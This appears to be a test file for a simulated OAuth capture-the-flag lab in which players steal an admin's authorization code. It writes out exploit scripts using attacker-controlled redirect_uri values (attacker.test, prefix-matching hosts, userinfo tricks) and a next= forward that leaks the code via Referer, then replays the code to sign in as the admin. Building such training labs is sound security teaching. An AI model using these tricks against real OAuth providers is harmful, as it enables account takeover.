// src/districts/gatekeeper/gk-10-oauth-redirect-uri/gk-10.spec.ts
import { createHash } from 'node:crypto';
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import {
  FLAG_RE, attackerHits, describeExploitMatrix, freshSession, panelOf, setCookieHeader, type Agent,
} from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import {
  browse, describeLabCookies, describeSignInView, describeVictimAction, expectAwayPage, expectInLab, expectNoWayOut, forwardNoteOf,
  victimClient,
} from '../../_shared/victim-lab.testkit.js';
import { s256, type Exchange, type IssuedCode } from '../_shared/oauth.js';
import { GK10 } from './challenge.js'; // registers GK-10 before createApp() inside freshSession
import * as divine from './levels/divine.js';
import { SIM_LIMITS } from '../../../core/sim.js';
import { authorize, clientCookie, labState, nextCookie, pidCookie, startLogin } from './model.js';

const LAB = '/d/gatekeeper/oauth-redirect-uri';
const ADMIN = 'citadel_admin';
const REGISTERED = 'http://citadel.test/callback';

type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Response>;

// --- The player's moves --------------------------------------------------------------------------------------------
const home = (a: Agent, l: Level, lang = 'en') => a.get(`${LAB}?level=${l}&lang=${lang}`);
const pidSignIn = (a: Agent, l: Level, username: string, password: string) =>
  a.post(`${LAB}?level=${l}`).type('form').send({ username, password });
const { sendLink } = victimClient(LAB);
/** An authorize request for client citadel, as a citadel.test link. */
const authorizeUrl = (redirectUri: string, extra = ''): string =>
  `http://citadel.test/idp/authorize?response_type=code&client_id=citadel&redirect_uri=${encodeURIComponent(redirectUri)}${extra}`;
const codeIn = (url: string | undefined): string => (url === undefined ? '' : new URL(url).searchParams.get('code') ?? '');
/** Present a code at the lab's real callback, as the browser would after Pilgrim-ID sent it there. */
const replay = (a: Agent, l: Level, code: string) => a.get(`${LAB}/callback?code=${encodeURIComponent(code || 'none')}&level=${l}`);
/** Your real browser follows "Sign in with Pilgrim-ID" to its last page. */
const signInWithPilgrimId = async (a: Agent, l: Level) => (await browse(a, `${LAB}/login?level=${l}`)).res;

// --- The exploits ----------------------------------------------------------------------------------------------------
/** Send the admin an authorize link whose redirect_uri is yours, read the code off your log, use it yourself. */
const stealVia = (redirectUri: string): Script => async (a, l) => {
  await sendLink(a, l, authorizeUrl(redirectUri));
  const hit = attackerHits((await home(a, l)).text).find((h) => h.url.includes('code='));
  return replay(a, l, codeIn(hit?.url));
};
// Acolyte: any redirect_uri.
const acolyteExploit = stealVia('http://attacker.test/cb');
// Templar: redirect_uri must start with http://citadel.test, and a host can start like that too.
const templarExploit = stealVia('http://citadel.test.attacker.test/cb');
// Inquisitor: redirect_uri must be exactly the registered one, but Citadel's callback page forwards to ?next= of the
// sign-in that started it, and a forwarding page sends its own URL (code and all) as the Referer.
const inquisitorExploit: Script = async (a, l) => {
  await sendLink(a, l, `http://citadel.test/login?next=${encodeURIComponent('http://attacker.test/')}`);
  const ref = attackerHits((await home(a, l)).text).find((h) => h.referer?.includes('code=') === true)?.referer;
  return replay(a, l, codeIn(ref));
};

describeExploitMatrix<Script>({
  challenge: GK10,
  path: LAB,
  send: (agent, level, script, _url, { sid }) => script(agent, level, sid),
  exploits: { acolyte: acolyteExploit, templar: templarExploit, inquisitor: inquisitorExploit },
  resisted: 'Sign-in failed',
  resistedStatus: 400,
  legit: [
    { name: 'sign in to Pilgrim-ID as pilgrim', input: (a, l) => pidSignIn(a, l, 'pilgrim', 'pilgrim'), expect: 'Signed in to Pilgrim-ID as pilgrim.' },
    {
      name: 'sign in to Citadel with your own Pilgrim-ID',
      input: async (a, l) => { await pidSignIn(a, l, 'pilgrim', 'pilgrim'); return signInWithPilgrimId(a, l); },
      expect: 'Welcome, pilgrim',
    },
    {
      name: 'the admin opens an honest sign-in link: nothing reaches your server',
      input: async (a, l) => { await sendLink(a, l, 'http://citadel.test/login'); return home(a, l); },
      expect: /ended on a citadel\.test page \(HTTP 200\)[\s\S]*No requests yet\./,
    },
  ],
  malformed: [], // no query and no parser: nothing that can raise a database error
  privileged: {
    name: 'the admin\'s own sign-in',
    input: async (a, l, sid) => { await pidSignIn(a, l, ADMIN, labState(sid, l).adminPassword); return signInWithPilgrimId(a, l); },
    expect: /Welcome, citadel_admin/,
  },
});

describeSignInView({ challenge: GK10, path: LAB });
describeVictimAction({
  challenge: GK10, path: LAB,
  description: { en: 'opens any link you send, while signed in to Pilgrim-ID', id: 'membuka tautan apa pun yang Anda kirim, saat masuk ke Pilgrim-ID' },
});
describeLabCookies({
  challenge: GK10, path: LAB,
  cookies: [{ name: pidCookie, set: (agent, level, base) => agent.post(`${base}?level=${level}`).type('form').send({ username: 'pilgrim', password: 'pilgrim' }) }],
});

describe('GK-10 where Pilgrim-ID sends the admin\'s code', () => {
  const UNREGISTERED = 'Pilgrim-ID: this redirect_uri is not registered for the client.';
  // Divine rows carry a PKCE challenge, so a refusal there is about the redirect_uri itself, never PKCE masking it.
  const PKCE = '&code_challenge=abc&code_challenge_method=S256';
  const cases: [Level, string, 'attacker' | 'unregistered' | 'no-pkce' | 'citadel'][] = [
    ['acolyte', 'http://attacker.test/cb', 'attacker'],
    ['acolyte', REGISTERED, 'citadel'],
    ['templar', 'http://attacker.test/cb', 'unregistered'],
    ['templar', 'http://citadel.test.attacker.test/cb', 'attacker'],
    ['templar', 'http://citadel.test@attacker.test/cb', 'attacker'],
    ['templar', REGISTERED, 'citadel'],
    ['inquisitor', 'http://citadel.test.attacker.test/cb', 'unregistered'],
    ['inquisitor', `${REGISTERED}?next=http://attacker.test/`, 'unregistered'],
    ['inquisitor', `${REGISTERED}/../x`, 'unregistered'],
    ['inquisitor', 'HTTP://CITADEL.TEST/callback', 'unregistered'],
    ['inquisitor', REGISTERED, 'citadel'],
    ['divine', 'http://attacker.test/cb', 'unregistered'],
    ['divine', 'http://citadel.test.attacker.test/cb', 'unregistered'],
    ['divine', `${REGISTERED}?x=1`, 'unregistered'],
    ['divine', `${REGISTERED}x`, 'unregistered'],
    ['divine', `${REGISTERED}/`, 'unregistered'],
    ['divine', 'HTTP://CITADEL.TEST/callback', 'unregistered'],
    ['divine', REGISTERED, 'no-pkce'],
  ];
  it.each(cases)('%s, redirect_uri %s: %s', async (level, redirectUri, where) => {
    const { agent, sid } = await freshSession();
    await sendLink(agent, level, authorizeUrl(redirectUri, level === 'divine' && where !== 'no-pkce' ? PKCE : ''));
    const visit = labState(sid, level).world.visits.at(-1)!;
    if (where === 'attacker') {
      expect(visit.outcome).toBe('attacker');
      expect(codeIn(attackerHits((await home(agent, level)).text)[0]?.url)).toMatch(/^[0-9a-f]{32}$/);
    } else if (where === 'unregistered' || where === 'no-pkce') {
      expect(visit.page).toMatchObject({ status: 400, body: where === 'no-pkce' ? 'Pilgrim-ID: PKCE (S256) is required.' : UNREGISTERED });
      expect(visit.hops).toHaveLength(1); // the code never left Pilgrim-ID
      expect(labState(sid, level).codes.size).toBe(0);
      expect(attackerHits((await home(agent, level)).text)).toEqual([]);
    } else {
      expect(visit.page).toMatchObject({ url: expect.stringMatching(/^http:\/\/citadel\.test\/callback\?code=/), status: 200 });
      expect(visit.page?.body).toContain('Signed in to Citadel as citadel_admin.');
    }
  });

  it('only a known client with response_type=code gets anywhere', async () => {
    const { agent, sid } = await freshSession();
    await sendLink(agent, 'acolyte', `http://citadel.test/idp/authorize?response_type=code&client_id=other&redirect_uri=${encodeURIComponent('http://attacker.test/')}`);
    expect(labState(sid, 'acolyte').world.visits.at(-1)?.page).toMatchObject({ status: 400, body: 'Pilgrim-ID: unknown client.' });
    await sendLink(agent, 'acolyte', `http://citadel.test/idp/authorize?response_type=token&client_id=citadel&redirect_uri=${encodeURIComponent('http://attacker.test/')}`);
    expect(labState(sid, 'acolyte').world.visits.at(-1)?.page?.status).toBe(400);
    expect(attackerHits((await home(agent, 'acolyte')).text)).toEqual([]);
  });

  it('divine: an exact redirect_uri with a PKCE challenge is accepted, and the state comes back', async () => {
    const { agent, sid } = await freshSession();
    await sendLink(agent, 'divine', authorizeUrl(REGISTERED, '&code_challenge=abc&code_challenge_method=S256&state=xyz'));
    const hops = labState(sid, 'divine').world.visits.at(-1)!.hops;
    expect(hops[1]).toMatchObject({ site: 'citadel', via: 'redirect' });
    expect(new URL(hops[1].url).searchParams.get('state')).toBe('xyz');
    expect(hops[1].url.startsWith(`${REGISTERED}?code=`)).toBe(true);
  });
});

describe('GK-10 divine: the token endpoint (levels/divine.ts redeem, called directly)', () => {
  // Directly on the level function: over HTTP the single-use login cookie stops a replay first and would mask these.
  const T0 = Date.UTC(2026, 10, 16, 12, 0, 0);
  const verifier = 'v'.repeat(43);
  const codeFor = (over: Partial<IssuedCode> = {}): IssuedCode => ({
    user: ADMIN, clientId: 'citadel', redirectUri: REGISTERED, challenge: s256(verifier), expiresAt: T0 + 600_000, used: false, ...over,
  });
  const honest: Exchange = { clientId: 'citadel', redirectUri: REGISTERED, verifier };

  it('redeems an honest exchange once: the same code a second time fails', () => {
    const code = codeFor();
    expect(divine.redeem(code, honest, T0)).toBe(true);
    expect(divine.redeem(code, honest, T0)).toBe(false);
  });

  it('a wrong verifier fails, and uses the code up', () => {
    const code = codeFor();
    expect(divine.redeem(code, { ...honest, verifier: 'w'.repeat(43) }, T0)).toBe(false);
    expect(divine.redeem(code, honest, T0)).toBe(false);
  });

  it('a redirect_uri other than the one the code was sent to fails', () => {
    expect(divine.redeem(codeFor(), { ...honest, redirectUri: `${REGISTERED}/` }, T0)).toBe(false);
    expect(divine.redeem(codeFor({ redirectUri: 'http://attacker.test/cb' }), honest, T0)).toBe(false);
  });

  it('another client fails', () => {
    expect(divine.redeem(codeFor(), { ...honest, clientId: 'other' }, T0)).toBe(false);
  });

  it('an expired code fails (expiresAt itself is too late)', () => {
    expect(divine.redeem(codeFor(), honest, T0 + 600_000 - 1)).toBe(true);
    expect(divine.redeem(codeFor(), honest, T0 + 600_000)).toBe(false);
  });

  it('PKCE both ways: a code without a challenge, or an exchange without a verifier, fails', () => {
    expect(divine.redeem(codeFor({ challenge: undefined }), honest, T0)).toBe(false);
    expect(divine.redeem(codeFor(), { clientId: 'citadel', redirectUri: REGISTERED }, T0)).toBe(false);
    expect(divine.redeem(undefined, honest, T0)).toBe(false);
  });
});

describe('GK-10 the victim flow end to end', () => {
  it('acolyte: the admin\'s code reaches your server, and it signs you in as the admin at the real callback', async () => {
    const { agent, sid } = await freshSession();
    labState(sid, 'acolyte').world.now = () => Date.UTC(2026, 10, 16, 11, 0, 0);
    await sendLink(agent, 'acolyte', authorizeUrl('http://attacker.test/cb'));
    const page = await home(agent, 'acolyte');
    const hits = attackerHits(page.text);
    expect(hits).toHaveLength(1);
    expect(hits[0]).toMatchObject({ method: 'GET', at: '2026-11-16T11:00:00.000Z' });
    expect(hits[0].url).toMatch(/^http:\/\/attacker\.test\/cb\?code=[0-9a-f]{32}$/);
    expect(hits[0].referer).toBeUndefined(); // a link opened from mail, then redirects: no Referer
    expect(panelOf(page.text)).toContain('Visit 1: 2 request(s); reached your server (attacker.test).');
    const flag = await replay(agent, 'acolyte', codeIn(hits[0].url));
    expect(flag.status).toBe(200);
    expect(flag.text).toContain('Welcome, citadel_admin (role: admin).');
    expect(flag.text).toMatch(FLAG_RE);
    expect((await home(agent, 'acolyte')).text).toMatch(FLAG_RE); // signed in to Citadel as the admin
  });

  it('inquisitor: the callback page forwards to next=, and its URL (with the code) is the Referer your server gets', async () => {
    const { agent, sid } = await freshSession();
    await sendLink(agent, 'inquisitor', `http://citadel.test/login?next=${encodeURIComponent('http://attacker.test/landing')}`);
    const visit = labState(sid, 'inquisitor').world.visits.at(-1)!;
    expect(visit.hops.map((h) => [h.site, h.via])).toEqual([['citadel', 'start'], ['citadel', 'redirect'], ['citadel', 'redirect'], ['attacker', 'refresh']]);
    const hit = attackerHits((await home(agent, 'inquisitor')).text)[0];
    expect(hit.url).toBe('http://attacker.test/landing');
    expect(hit.referer).toMatch(/^http:\/\/citadel\.test\/callback\?code=[0-9a-f]{32}$/);
    expect([...labState(sid, 'inquisitor').clientSessions.values()]).toContain(ADMIN); // the admin did sign in, too
    expect((await replay(agent, 'inquisitor', codeIn(hit.referer))).text).toMatch(FLAG_RE);
  });

  it('divine: the same sign-in link signs the admin in and goes nowhere else', async () => {
    const { agent, sid } = await freshSession();
    await sendLink(agent, 'divine', `http://citadel.test/login?next=${encodeURIComponent('http://attacker.test/landing')}`);
    const visit = labState(sid, 'divine').world.visits.at(-1)!;
    expect(visit.outcome).toBe('page');
    expect(visit.page?.body).toContain('Signed in to Citadel as citadel_admin.');
    expect(attackerHits((await home(agent, 'divine')).text)).toEqual([]);
  });

  it('divine: a code is bound to its PKCE verifier and used once', async () => {
    const { agent, sid } = await freshSession();
    // The admin is sent an authorize link with a challenge you chose; the admin's own callback refuses it (not started there).
    await sendLink(agent, 'divine', authorizeUrl(REGISTERED, `&code_challenge=${createHash('sha256').update('mine').digest('base64url')}&code_challenge_method=S256&state=s1`));
    const visit = labState(sid, 'divine').world.visits.at(-1)!;
    expect(visit.page).toMatchObject({ status: 400 });
    const code = codeIn(visit.hops[1].url); // test seam: the code the admin's browser carried
    // Your own sign-in gives you a state and a verifier the client keeps; your stolen code does not match that verifier.
    const start = await agent.get(`${LAB}/login?level=divine`);
    const authorize = new URL(String(start.headers.location), 'http://lab.invalid');
    const state = authorize.searchParams.get('state') ?? '';
    const res = await agent.get(`${LAB}/callback?code=${code}&state=${state}&level=divine`);
    expect(res.status).toBe(400);
    expect(res.text).toContain('Sign-in failed');
    expect(res.text).not.toMatch(FLAG_RE);
    // An honest code works once only.
    await pidSignIn(agent, 'divine', 'pilgrim', 'pilgrim');
    const first = await agent.get(`${LAB}/login?level=divine`);
    const second = await agent.get(String(first.headers.location)); // Pilgrim-ID's answer, mapped into the lab
    const callback = String(second.headers.location);
    expect((await agent.get(callback)).text).toContain('Welcome, pilgrim');
    expect((await agent.get(callback)).text).toContain('Sign-in failed');
  });

  it('the admin is signed in to Pilgrim-ID at the start of every action, whatever happened before', async () => {
    const { agent, sid } = await freshSession();
    labState(sid, 'acolyte').admin.cookies.clear(); // as if a link had signed the admin out
    await sendLink(agent, 'acolyte', authorizeUrl('http://attacker.test/cb'));
    expect(attackerHits((await home(agent, 'acolyte')).text)).toHaveLength(1);
  });

  it('the page never shows the admin\'s code except in your server\'s log', async () => {
    const { agent, sid } = await freshSession();
    await sendLink(agent, 'acolyte', authorizeUrl(REGISTERED)); // honest: the admin signs in to Citadel
    const code = codeIn(labState(sid, 'acolyte').world.visits.at(-1)!.hops[1].url);
    expect(code).toMatch(/^[0-9a-f]{32}$/);
    expect((await home(agent, 'acolyte')).text).not.toContain(code);
  });

  it('isolates players and levels: a stolen code works only in the lab that issued it', async () => {
    const a = await freshSession();
    const b = await freshSession(a.app);
    await sendLink(a.agent, 'acolyte', authorizeUrl('http://attacker.test/cb'));
    const code = codeIn(attackerHits((await home(a.agent, 'acolyte')).text)[0]?.url);
    expect(attackerHits((await home(b.agent, 'acolyte')).text)).toEqual([]);
    expect((await replay(b.agent, 'acolyte', code)).text).not.toMatch(FLAG_RE);
    expect((await replay(a.agent, 'templar', code)).text).not.toMatch(FLAG_RE);
    expect((await replay(a.agent, 'acolyte', code)).text).toMatch(FLAG_RE);
  });
});

describe('GK-10 your real browser never leaves the lab (sendSimRedirect)', () => {
  it('Sign in with Pilgrim-ID: every hop is a Location inside the lab, at the served level', async () => {
    for (const level of LEVELS) {
      const { agent } = await freshSession();
      await pidSignIn(agent, level, 'pilgrim', 'pilgrim');
      const start = await agent.get(`${LAB}/login?level=${level}`);
      expect(start.status, level).toBe(302);
      expect(expectInLab(start, LAB, level, level), level).toMatch(new RegExp(`^${LAB}/idp/authorize\\?.*&level=${level}$`));
      const back = await agent.get(String(start.headers.location));
      expect(back.status, level).toBe(302);
      expect(expectInLab(back, LAB, level, level), level).toMatch(new RegExp(`^${LAB}/callback\\?code=[0-9a-f]{32}.*&level=${level}$`));
    }
  });

  it('an attacker redirect_uri in your own browser is a page saying where it would go, never a Location', async () => {
    const { agent } = await freshSession();
    await pidSignIn(agent, 'acolyte', 'pilgrim', 'pilgrim');
    for (const redirect of ['http://attacker.test/cb', 'https://evil.example/', '//attacker.test/x', 'javascript:alert(1)']) {
      const res = await agent.get(`${LAB}/idp/authorize?response_type=code&client_id=citadel&redirect_uri=${encodeURIComponent(redirect)}&level=acolyte`);
      expectAwayPage(res, redirect);
    }
  });

  it('inquisitor: a forward to another host in your own browser is the callback page with a note, never a Refresh or Location', async () => {
    const { agent } = await freshSession();
    await pidSignIn(agent, 'inquisitor', 'pilgrim', 'pilgrim');
    const { res } = await browse(agent, `${LAB}/login?level=inquisitor&lang=en&next=${encodeURIComponent('http://attacker.test/x')}`);
    expectNoWayOut(res);
    expect(res.text).toContain('Welcome, pilgrim'); // the page itself, not only where it would go
    const note = forwardNoteOf(res.text);
    expect(note).toContain('This page moves the browser on by itself to: <code>http://attacker.test/x</code>.');
    expect(note).not.toMatch(/href=/);
  });

  it('inquisitor: a forward to a citadel page is shown with a link into the lab', async () => {
    const { agent } = await freshSession();
    await pidSignIn(agent, 'inquisitor', 'pilgrim', 'pilgrim');
    const { res } = await browse(agent, `${LAB}/login?next=%2F&level=inquisitor&lang=en`); // the home page's own link
    expectNoWayOut(res);
    expect(res.text).toContain('Welcome, pilgrim');
    expect(forwardNoteOf(res.text)).toContain(`<code>http://citadel.test/</code>. <a href="${LAB}?level=inquisitor">Continue there in the lab</a>`);
  });

  it('the other levels never forward: no note on the callback page', async () => {
    for (const level of ['acolyte', 'templar', 'divine'] as const) {
      const { agent } = await freshSession();
      await pidSignIn(agent, level, 'pilgrim', 'pilgrim');
      const { res } = await browse(agent, `${LAB}/login?level=${level}&next=${encodeURIComponent('http://attacker.test/x')}`);
      expect(res.text, level).toContain('Welcome, pilgrim');
      expect(forwardNoteOf(res.text), level).toBe('');
    }
  });
});

describe('GK-10 inquisitor: a stale next never swallows the flag', () => {
  // The reviewer's repro: a sign-in started with next= while signed out of Pilgrim-ID leaves the next behind; a stolen
  // code replayed later must still sign you in as the admin and show the flag.
  const stealAtInquisitor = async (a: Agent): Promise<string> => {
    await sendLink(a, 'inquisitor', `http://citadel.test/login?next=${encodeURIComponent('http://attacker.test/')}`);
    return codeIn(attackerHits((await home(a, 'inquisitor')).text).at(-1)?.referer);
  };

  it('a stolen code replayed after a sign-in left a next behind: the flag, and the forward as a note', async () => {
    const { agent } = await freshSession();
    const { res: left } = await browse(agent, `${LAB}/login?level=inquisitor&next=${encodeURIComponent('http://attacker.test/')}`);
    expect(left.text).toContain('Pilgrim-ID: sign in first'); // signed out of Pilgrim-ID: the flow stopped there
    const res = await replay(agent, 'inquisitor', await stealAtInquisitor(agent));
    expectNoWayOut(res);
    expect(res.text).toContain('Welcome, citadel_admin (role: admin).');
    expect(res.text).toMatch(FLAG_RE);
    expect(forwardNoteOf(res.text)).toContain('<code>http://attacker.test/</code>');
  });

  it('the next a sign-in left behind expires after 10 minutes of the lab clock', async () => {
    const { agent, sid } = await freshSession();
    const world = labState(sid, 'inquisitor').world;
    const t0 = Date.UTC(2026, 10, 16, 12, 0, 0);
    world.now = () => t0;
    const start = await agent.get(`${LAB}/login?level=inquisitor&next=${encodeURIComponent('http://attacker.test/')}`);
    expect(setCookieHeader(start, nextCookie('inquisitor'))).toMatch(/Max-Age=600;/);
    world.now = () => t0 + 10 * 60_000;
    const res = await replay(agent, 'inquisitor', await stealAtInquisitor(agent));
    expect(res.text).toMatch(FLAG_RE);
    expect(forwardNoteOf(res.text)).toBe('');
  });

  it('a next is used once: the callback forgets it', async () => {
    const { agent } = await freshSession();
    await pidSignIn(agent, 'inquisitor', 'pilgrim', 'pilgrim');
    await browse(agent, `${LAB}/login?level=inquisitor&next=${encodeURIComponent('http://attacker.test/')}`);
    const again = await replay(agent, 'inquisitor', await stealAtInquisitor(agent));
    expect(again.text).toMatch(FLAG_RE);
    expect(forwardNoteOf(again.text)).toBe('');
  });
});

describe('GK-10 the lab state', () => {
  // The cookie names, paths and HttpOnly: describeLabCookies above.
  it('after a sign-in on an upper-case URL, Sign in with Pilgrim-ID works at every level; a failed callback sets no Citadel cookie', async () => {
    const { agent } = await freshSession();
    for (const level of LEVELS) {
      await agent.post(`${LAB.toUpperCase()}?level=${level}`).type('form').send({ username: 'pilgrim', password: 'pilgrim' });
      const done = await signInWithPilgrimId(agent, level);
      expect(done.text, level).toContain('Welcome, pilgrim');
    }
    const res = await agent.get(`${LAB}/callback?level=acolyte&code=none`);
    expect(setCookieHeader(res, clientCookie('acolyte'))).toBeUndefined();
  });

  it('authorize before signing in to Pilgrim-ID asks you to sign in, and issues nothing', async () => {
    const { agent, sid } = await freshSession();
    const res = await agent.get(`${LAB}/idp/authorize?response_type=code&client_id=citadel&redirect_uri=${encodeURIComponent(REGISTERED)}&level=acolyte`);
    expect(res.status).toBe(200);
    expect(res.text).toContain('Pilgrim-ID: sign in first');
    expect(labState(sid, 'acolyte').codes.size).toBe(0);
  });

  it('codes and sessions stay bounded', async () => {
    const { agent, sid } = await freshSession();
    await pidSignIn(agent, 'acolyte', 'pilgrim', 'pilgrim');
    for (let i = 0; i < 70; i++) await agent.get(`${LAB}/idp/authorize?response_type=code&client_id=citadel&redirect_uri=${encodeURIComponent(REGISTERED)}&level=acolyte`);
    for (let i = 0; i < 70; i++) await pidSignIn(agent, 'acolyte', 'pilgrim', 'pilgrim');
    const state = labState(sid, 'acolyte');
    expect(state.codes.size).toBeLessThanOrEqual(50);
    expect(state.idpSessions.size).toBeLessThanOrEqual(50);
    expect([...state.idpSessions.values()]).toContain(ADMIN); // the admin's Pilgrim-ID session is never pushed out
  });

  it('a wrong password does not sign in to Pilgrim-ID', async () => {
    const { agent } = await freshSession();
    for (const level of LEVELS) {
      for (const [u, p] of [['pilgrim', 'nope'], [ADMIN, 'pilgrim'], [ADMIN, '']]) {
        expect((await pidSignIn(agent, level, u, p)).text, level).toContain('Invalid username or password.');
      }
    }
  });
});

describe('GK-10 lab view specifics', () => {
  it('tells the client\'s registered redirect URI and links the sign-in by its absolute path', async () => {
    const { agent } = await freshSession();
    const page = await home(agent, 'templar');
    expect(page.text).toContain(`<code>${REGISTERED}</code>`);
    expect(page.text).toContain(`href="${LAB}/login?next=%2F&amp;level=templar"`);
  });
});

describe('GK-10 keeps player strings bounded: one past the URL cap, as copies (memory, not semantics)', () => {
  const cap = SIM_LIMITS.urlLength + 1; // one past the cap, as for mail links: an over-long value stays too long to follow
  const long = (tag: string) => `http://attacker.test/${tag}/`.padEnd(16_000, '\u2713'); // ~Node's header cap, two-byte
  let n = 0;

  it("a 16 KB next (Citadel's return) and redirect_uri and code_challenge (Pilgrim-ID's code) are stored clipped", () => {
    const state = labState(`clip-${++n}`, 'acolyte');
    startLogin({ level: 'acolyte', query: new URLSearchParams({ next: long('n') }), cookies: {}, base: '' }, state);
    const ret = [...state.returns.values()][0];
    expect(ret.next).toBe(long('n').slice(0, cap));
    const reply = authorize({
      level: 'acolyte', base: '', cookies: { [pidCookie('acolyte')]: state.adminPid },
      query: new URLSearchParams({ response_type: 'code', client_id: 'citadel', redirect_uri: long('r'), code_challenge: long('c'), code_challenge_method: 'S256' }),
    }, state);
    const code = [...state.codes.values()][0];
    expect([code.redirectUri, code.challenge]).toEqual([long('r').slice(0, cap), long('c').slice(0, cap)]);
    expect(reply.location?.startsWith(long('r'))).toBe(true); // the redirect itself still goes where it was asked
  });

  it('the stored copies keep no 16 KB request string alive', () => {
    const gc = (globalThis as { gc?: () => void }).gc as () => void;
    const states = Array.from({ length: 4 }, () => labState(`clip-${++n}`, 'acolyte'));
    gc(); gc();
    const before = process.memoryUsage().heapUsed;
    for (const [i, state] of states.entries()) {
      for (let k = 0; k < 40; k++) {
        // Each value is a short view into a fresh 256 KB string: kept as a view, it would pin the whole parent.
        const parent = `${i}-${k}-`.padEnd(256 * 1024, 'x');
        startLogin({ level: 'acolyte', query: new URLSearchParams({ next: parent.slice(0, 3000) }), cookies: {}, base: '' }, state);
      }
    }
    gc(); gc();
    // As views: 160 x 256 KB = 40 MB. As copies: 160 x ~2 KB plus the maps.
    expect(process.memoryUsage().heapUsed - before).toBeLessThan(4 * 1024 * 1024);
  });
});
